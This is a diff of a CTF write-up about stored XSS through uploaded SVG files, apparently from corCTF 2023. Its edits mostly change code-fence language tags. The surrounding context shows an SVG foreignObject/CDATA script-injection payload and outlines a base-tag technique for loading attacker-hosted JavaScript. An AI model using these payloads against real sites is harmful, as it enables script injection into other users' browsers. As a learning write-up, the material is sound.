@@ -158,7 +158,7 @@ Hmm... I can smell some **stored/persistence XSS (Cross-Site Scripting) via SVG*
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731152053.png)
 
 **Let's use the first one:**
-```svg
+```html
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
@@ -253,7 +253,7 @@ It indeed fetched, **but where's the `<script>` tag??**
 Ahh... It'll strip all `<script>` tags and inline scripts (i.e: `onerror`)...
 
 **After some trial and error, I found that the second payload in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-svg-short) is interesting:**
-```svg
+```html
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 ```
 
@@ -277,7 +277,7 @@ What's that `<foreignObject>` element??
 **Hmm... We can try to use `<foreignObject>` element to inject our evil `<script>` tag!**
 
 **After fumbling around, I found [this writeup](https://insert-script.blogspot.com/2020/09/xss-challenge-solution-svg-use.html), which uses `<iframe>` tag inside the `<foreignObject>` element to achieve stored XSS via SVG:**
-```svg
+```html
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
@@ -367,7 +367,7 @@ Hmm... There are 2 high severity finding:
 Armed with above information, **we can inject a `<base>` tag via SVG, and let those JavaScript files imported from our web server!!**
 
 **payload.svg:**
-```svg
+```html
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
@@ -382,7 +382,7 @@ Armed with above information, **we can inject a `<base>` tag via SVG, and let th
 
 **Update the SVG URL again:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731162207.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731180918.png)
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731162330.png)
 
@@ -505,7 +505,7 @@ After fumbling around, the shared frog page must need to ***refresh*** in order 
 **To solve that problem, we can use the `<meta>` tag.**
 
 **Let's modify our SVG payload again:**
-```svg
+```html
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
